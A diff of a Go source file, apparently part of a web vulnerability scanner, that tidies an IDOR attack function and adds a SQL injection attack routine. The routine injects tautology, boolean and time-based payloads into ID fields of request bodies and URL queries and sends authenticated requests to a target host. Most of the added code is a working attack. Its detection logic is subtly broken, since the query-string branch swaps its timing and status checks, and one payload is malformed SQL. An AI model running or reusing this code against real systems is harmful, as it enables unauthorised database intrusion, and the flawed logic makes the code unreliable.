@@ -27,6 +27,7 @@ Sorry python.
 
 import (
 	"bytes"
+	"encoding/base64"
 	"encoding/json"
 	"errors"
 	"flag"
@@ -35,14 +36,12 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"regexp"
 	"strconv"
 	"strings"
 	"time"
-	"regexp"
-	"encoding/base64"
 
 	"github.com/golang-jwt/jwt/v5"
-	
 )
 
 var (
@@ -335,14 +334,12 @@ func createAttackID(value string) string {
 // Its support : base64, UUID v4, number, string
 // Target only: Path, Url Form, Body Form/Json
 
-// Target Payload curren: "id","user_id","ID","user_ID","uuid","document","user"
-
+// Target Payload current: "id","user_id","ID","user_ID","uuid","document","user"
 
 func IdorAttack(data map[string]any) (map[string]any, error) {
 	result := map[string]any{}
 	result["Found"] = false
 	KnownCommon := []string{"id","user_id","ID","user_ID","uuid","document","user"}
-	fmt.Printf("[!] The IDOR attack only scan - %v\n", KnownCommon)
 
 	if len(data) == 0 {
 		return result, errors.New("Invalid data")
@@ -554,8 +551,218 @@ func IdorAttack(data map[string]any) (map[string]any, error) {
 	return result, nil
 }
 
+// Sqli attack only basic.
+// Its support : base64, UUID v4, number, string
+// Target only: Url Form, Body Form/Json
+
+// Target Payload current: "id","user_id","ID","user_ID","uuid","document","user"
+// Target Payload SQL cuurent: time based, boolean based, blind based
+
+func sqliAttack(data map[string]any) (map[string]any, error) {
+	result := map[string]any{}
+	result["Found"] = false
+	KnownCommon := []string{"id","user_id","ID","user_ID","uuid","document","user"}
+	SqliPayloads := []string{"' OR '1'='1'--","' AND '1'='1'--","' AND '1'='2'--", "' SLEEP(5)--"}
 
 
+	if len(data) == 0 {
+		return result, errors.New("Invalid data")
+	}
+
+	Headers, ok := data["Headers"].(map[string]string)
+	if !ok {
+		return result, errors.New("Invalid Headers")
+	}
+
+	if Headers["Authorization"] == "" && Headers["Cookie"] == "" {
+		return result, errors.New("Invalid Auth, User is not Auth")
+	}
+
+	tr := &http.Transport{
+		MaxIdleConns:       10,
+		IdleConnTimeout:    30 * time.Second,
+		DisableCompression: true,
+	}
+
+	client := &http.Client{
+		Transport: tr,
+	}
+
+	Method := data["Method"].(string)
+	if Method == "" {
+		return result, errors.New("Invalid Method")
+	}
+
+	body, ok := data["Data"].(map[string]any)
+	if !ok {
+		return result, errors.New("Invalid body")
+	}
+
+	DataType := data["DataType"].(string)
+	
+	// Sqli based data body
+
+	for _, payload := range SqliPayloads {
+		for _, key := range KnownCommon {
+			value, exist := body[key]
+			if !exist {
+				continue
+			}
+
+			MainID := fmt.Sprint(value)
+
+			AttackID := fmt.Sprintf("%s%s", MainID, payload)
+
+			body[key] = AttackID
+
+			BodyEncode, err := checktypedata(body, DataType)
+			if err != nil {
+				continue
+			}
+
+			requestURL := fmt.Sprintf("http://%v", Headers["Host"]) // for testing
+			//requestURL := fmt.Sprintf("https://%v", Headers["Host"]) // real target
+			req , err := createNewRequest(Method, requestURL, BodyEncode, Headers)
+
+			if err != nil {
+				return result, err
+			}
+
+			fmt.Printf("Main ID - %v\n", MainID)
+			fmt.Printf("Attack Payload - %v\n", AttackID)
+
+			if payload == "' SLEEP(5)--" {
+				start := time.Now()
+
+				res, err := client.Do(req)
+				if err != nil {
+					return result, err
+				}
+
+				body[key] = MainID
+
+				elapsed := time.Since(start)
+				
+
+				if elapsed >= 5 * time.Second {
+					result["Found"] = true
+					result["Payload"] = key
+					result["MainID"] = MainID
+					result["AttackID"] = AttackID
+					result["Status"] = res.StatusCode
+					break
+				}
+			} else {
+				res, err := client.Do(req)
+				if err != nil {
+					return result, err
+				}
+
+				body[key] = MainID
+
+				if res.StatusCode >= 500 && res.StatusCode < 600 {
+					result["Found"] = true
+					result["Payload"] = key
+					result["MainID"] = MainID
+					result["AttackID"] = AttackID
+					result["Status"] = res.StatusCode
+					break
+				}
+			}
+		}
+
+		
+
+		Path, ok := data["Path"].(string)
+		if !ok {
+			return result, errors.New("Invalid Path")
+		}
+
+		// Sqli based Url form
+		q, err := url.Parse(Path)
+		if err != nil {
+			return result, err
+		}
+
+		query := q.Query()
+
+		for _, key := range KnownCommon {
+			values, exist := query[key]
+			if !exist {
+				continue
+			}
+
+			for i, value := range values {
+				MainID := fmt.Sprint(value)
+
+				AttackID := fmt.Sprintf("%s%s", MainID, payload)
+
+				query[key][i] = AttackID
+
+				q.RawQuery = query.Encode()
+
+				requestURL := fmt.Sprintf("http://%v%s", Headers["Host"], q.RequestURI()) // for testing
+				//requestURL := fmt.Sprintf("https://%v%s", Headers["Host"]) // real target
+				req , err := createNewRequest(Method, requestURL, nil, Headers)
+
+				if err != nil {
+					return result, err
+				}
+
+				fmt.Printf("Main ID - %v\n", MainID)
+				fmt.Printf("Attack Payload - %v\n", AttackID)
+
+				if payload == "' SLEEP(5)--" {
+					res, err := client.Do(req)
+
+					if err != nil {
+						return result, err
+					}
+
+					query[key][i] = MainID
+
+					q.RawQuery = query.Encode()
+
+					if res.StatusCode >= 500 && res.StatusCode < 600 {
+						result["Found"] = true
+						result["Payload"] = key
+						result["MainID"] = MainID
+						result["AttackID"] = AttackID
+						result["Status"] = res.StatusCode
+						break
+					}
+				} else {
+					start := time.Now()
+
+					res, err := client.Do(req)
+
+					if err != nil {
+						return result, err
+					}
+
+					query[key][i] = MainID
+
+					q.RawQuery = query.Encode()
+
+					elapsed := time.Since(start)
+
+					if elapsed >= 5 * time.Second  {
+						result["Found"] = true
+						result["Payload"] = key
+						result["MainID"] = MainID
+						result["AttackID"] = AttackID
+						result["Status"] = res.StatusCode
+						break
+					}
+				}
+			}
+		}
+	}
+
+
+
+	return result, nil
+}
 
 
 func init() {
